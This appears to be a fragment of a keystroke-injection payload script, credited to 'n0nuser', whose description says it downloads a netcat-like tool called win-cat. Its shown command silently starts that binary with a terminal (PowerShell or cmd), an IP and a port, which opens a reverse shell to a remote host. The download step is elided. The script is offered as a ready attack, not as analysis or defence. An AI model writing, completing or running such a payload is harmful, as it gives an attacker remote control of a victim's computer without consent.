class info:
    author="n0nuser"
    description = "Downloads TomDaley92's win-cat. IP and Port needed; Terminal refers to either \"powershell\" or \"cmd\"."
...
STRING Start-Process -NoNewWindow ./a.exe -k -c TERMINAL IP PORT
ENTER
DELAY 500
